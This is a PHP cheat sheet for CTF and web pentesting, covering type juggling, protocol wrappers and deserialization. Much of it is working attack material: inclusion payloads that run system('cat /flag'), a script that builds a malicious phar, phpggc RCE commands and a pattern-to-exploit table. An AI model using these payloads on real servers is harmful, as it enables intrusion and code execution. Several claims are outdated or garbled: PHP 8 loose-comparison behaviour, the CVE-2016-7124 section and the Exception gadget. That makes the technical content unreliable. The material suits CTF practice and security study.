# PHP Tricks & Gotchas for CTF / Web Pentest

> PHP is the dominant language in CTF web challenges. Understanding its quirks, weak typing, and protocol wrappers is essential for fast exploitation.

---

## 1. Weak Type Comparison (弱类型比较)

### 1.1 `==` vs `===`

```php
"0e462097431906509019562988736854" == "0"           // true (scientific notation)
"0e123456789" == "0e987654321"                     // true (both evaluate to 0)
"0e462097431906509019562988736854" == "0"          // true
"0e215962017" == "0e240736146"                     // true
```

> **MD5 magic hashes**: Strings that start with `0e` followed by digits will be parsed as `0` in scientific notation.

```php
md5('240610708')  == md5('QNKCDZO')     // both start with 0e...
md5('aabg7XSs')   == md5('aabC9RqS')    // both start with 0e...
sha1('aaroZmOk')  == sha1('aaK1STfY')   // both start with 0e...
```

### 1.2 Integer Overflow

```php
9223372036854775807  == 9223372036854775808   // true (64-bit overflow)
"1" == true
"0" == false
"" == false
0 == false
NULL == false
[] == false
```

### 1.3 String to Number Conversion

```php
"1abc" == 1          // true (stops at first non-digit)
"abc1" == 0          // true (no digits at start → 0)
"1e3" == 1000        // true (scientific notation)
"0x1a" == 26         // PHP 5: true; PHP 7+: false (hex in strings deprecated)
```

### 1.4 Array Comparison

```php
[] == false          // true
[1] == true          // true
[0] == false         // false (non-empty)
```

---

## 2. Type Juggling Attack Vectors

### 2.1 JSON `true` vs String `"true"`

```php
json_decode('{"is_admin": true}')['is_admin'] == "true"   // true
json_decode('{"is_admin": 1}')['is_admin'] == true        // true
```

### 2.2 String `0` vs Integer `0`

```php
if ($_GET['password'] == 0) { /* bypass! */ }
# Visit: ?password=abc    → "abc" == 0 → true (string starts with non-digit)
```

### 2.3 SHA1/MD5 on Arrays

```php
md5([1,2,3]) == md5([4,5,6])    // true (both return NULL and warn)
sha1([1,2,3]) == sha1([4,5,6])  // true
```

**Exploit**: If a comparison is `md5($user_input) == $expected_hash`, pass an array `?input[]=` to bypass.

---

## 3. PHP Protocol Wrappers (伪协议)

### 3.1 `php://filter`

Read source code as base64 (bypasses PHP execution):
```
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
```

**Chain multiple filters**:
```
php://filter/read=convert.base64-encode|convert.base64-encode/resource=flag.php
```

### 3.2 `php://input`

Read raw POST data:
```
POST /?page=php://input HTTP/1.1

<?php system('cat /flag'); ?>
```

### 3.3 `data://`

Embed PHP code in URL:
```
data://text/plain,<?php system('cat /flag'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### 3.4 `expect://`

Execute commands (requires `expect` extension, rare):
```
expect://id
expect://cat /flag
```

### 3.5 `zip://` / `phar://`

```
zip:///var/www/html/upload.zip#shell.php
phar:///var/www/html/upload.phar/shell.php
```

### 3.6 `file://`

```
file:///etc/passwd
file:///var/www/html/flag.php
```

---

## 4. `preg_replace` /e Modifier (Deprecated but common in CTF)

```php
preg_replace('/(.*)/e', 'system("cat /flag")', 'anything');
```

The `/e` modifier evaluates the replacement string as PHP code.

> **PHP 5.5+**: `/e` is deprecated. **PHP 7.0+**: Removed entirely. Still common in older CTF challenges.

---

## 5. `unserialize` POP Chain (反序列化 POP 链)

### 5.1 Magic Methods

| Method | Trigger |
|--------|---------|
| `__destruct()` | Object destroyed (end of script or `unset`) |
| `__wakeup()` | `unserialize()` called |
| `__toString()` | Object used as string (`echo`, `(string)`, string concat) |
| `__get($name)` | Accessing undefined property |
| `__set($name, $value)` | Writing to undefined property |
| `__call($name, $args)` | Calling undefined method |
| `__invoke()` | Object called as function `$obj()` |
| `__isset()` | `isset()` or `empty()` on undefined property |

### 5.2 Common Gadget Chains

**PHP Built-in (no custom classes needed)**:
```php
// Error → __toString → file read
$a = new Exception("<?php system('id');?>");
echo urlencode(serialize($a));
```

**Laravel / Symfony / Yii**: Known POP chains in popular frameworks.

Tool: `phpggc` (https://github.com/ambionics/phpggc)
```bash
phpggc Laravel/RCE1 "system('cat /flag')"
phpggc Symfony/RCE1 "system('cat /flag')"
```

### 5.3 Phar Deserialization (phar://)

Even `file_exists('phar://upload.phar')` triggers `unserialize()` on phar metadata!

```php
// Create malicious phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// Embed serialized object in metadata
class Evil {
    public $cmd = "cat /flag";
    function __destruct() { system($this->cmd); }
}
$phar->setMetadata(new Evil());
$phar->stopBuffering();
```

Upload as `.jpg`, then trigger via:
```
?file=phar://uploads/image.jpg
```

---

## 6. `__wakeup` CVE-2016-7124 (Object Injection)

```php
class Test {
    public $cmd = 'id';
    function __wakeup() { system($this->cmd); }
}
```

If serialized object has **more properties** than the class definition, `__wakeup()` is **NOT** called in PHP 5.6-7.0. But in modern PHP, property mismatches still trigger it.

---

## 7. PHP Session Upload Progress (文件上传竞争)

PHP's `session.upload_progress` can be abused for LFI-to-RCE:

1. Upload a file with `PHP_SESSION_UPLOAD_PROGRESS` in multipart form
2. The temporary file contains your PHP code
3. Race condition: LFI-include the temp file before it's deleted

Tool: `https://github.com/darthvader31/pwnhub`

---

## 8. `extract()` Variable Overwrite

```php
$flag = 'real_flag{...}';
extract($_GET);   // Overwrites $flag if ?flag=fake
```

If `extract()` is called after sensitive variables are defined, GET/POST parameters can overwrite them.

---

## 9. `parse_str()` Variable Overwrite

```php
parse_str($_SERVER['QUERY_STRING']);   // Same as extract() for query string
```

---

## 10. `strcmp` with Array

```php
$password = "secret123";
if (strcmp($_GET['password'], $password) == 0) { /* auth bypass */ }
```

Pass array: `?password[]=`
- `strcmp(array(), "string")` returns `NULL`
- `NULL == 0` is `true` in PHP

---

## 11. `in_array` Weak Comparison

```php
$whitelist = [0, 1, 2, 3];
if (in_array($_GET['id'], $whitelist)) { /* execute */ }
```

Pass: `?id=abc`
- `in_array("abc", [0,1,2,3])` → `"abc" == 0` → `true`!

Fix: Use `in_array($val, $arr, true)` for strict comparison.

---

## 12. `switch` Weak Comparison

```php
switch ($_GET['type']) {
    case 0: echo "zero"; break;
    case 1: echo "one"; break;
}
```

Pass `?type=abc` → matches `case 0` because `"abc" == 0` is `true`.

---

## 13. `is_numeric` Bypass

```php
is_numeric("0x1a")      // PHP 5: true; PHP 7+: false
is_numeric("1e3")       // true (scientific notation)
is_numeric("+123")      // true
is_numeric("-123")      // true
is_numeric(" 123 ")     // true
is_numeric("123\n")     // true
is_numeric("123\x00")   // true (NULL byte)
```

---

## 14. `intval` / `floatval` Precision Loss

```php
intval(1e309)   // PHP 7+: 0 (INF → 0)
floatval("1e309") // INF
```

---

## 15. `json_decode` depth / assoc quirks

```php
json_decode('{"0": true}', true)    // array with key "0"
json_decode('{"0": true}', false)   // object with property "0"
```

---

## 16. `preg_match` with Newlines

```php
preg_match('/^flag/', $_GET['input'])
```

Bypass with multiline:
```
?input=%0aflag{...}
```

`^` matches start of **line**, not start of string, with `/m` flag. Without `/m`, it only matches start of string.

But `preg_match` in PHP does NOT use `/m` by default. However, if the regex is user-controlled:
```
?regex=/^flag/m&input=anything%0aflag{...}
```

---

## 17. `file_get_contents` with `php://input`

```php
$content = file_get_contents("php://input");
```

Can read raw POST body, bypassing normal form processing.

---

## 18. `scandir` / `glob` for Directory Listing

```php
print_r(scandir('.'));
print_r(glob('*'));
print_r(glob('*.php'));
```

---

## 19. `ReflectionClass` / `ReflectionFunction`

```php
$ref = new ReflectionClass('SomeClass');
print_r($ref->getMethods());
print_r($ref->getProperties());
```

Useful for enumerating class internals in black-box challenges.

---

## 20. `get_defined_vars` / `get_defined_functions`

```php
print_r(get_defined_vars());       // All variables in scope
print_r(get_defined_functions());  // All functions
print_r(get_declared_classes());   // All classes
```

Great for finding hidden classes/variables.

---

## 21. `error_reporting(0)` Bypass

When errors are suppressed, use alternative methods to extract info:
- `var_dump()` on objects reveals structure
- `ReflectionClass` reveals methods
- `print_r(get_defined_vars())` reveals variables

---

## 22. Common CTF PHP Patterns

| Pattern | Vulnerability | Quick Exploit |
|---------|--------------|---------------|
| `unserialize($_GET['data'])` | Object Injection | Craft POP chain / use phpggc |
| `include($_GET['page'])` | LFI/RFI | `php://filter`, `data://`, `phar://` |
| `preg_replace('/xxx/e', ...)` | Code Execution | Any input triggers eval |
| `extract($_GET)` | Variable Overwrite | Overwrite `$flag`, `$auth` |
| `strcmp($input, $password) == 0` | Auth Bypass | Pass array: `?password[]=` |
| `in_array($input, $whitelist)` | Auth Bypass | Pass string: `?id=abc` |
| `md5($input) == $expected` | Hash Collision | Pass array or magic hash |
| `$_GET['password'] == 0` | Type Juggling | `?password=abc` |
| `switch($_GET['type'])` | Type Juggling | `?type=abc` matches case 0 |
| `file_exists($_GET['file'])` | Phar Deserial | Upload phar, trigger via `phar://` |
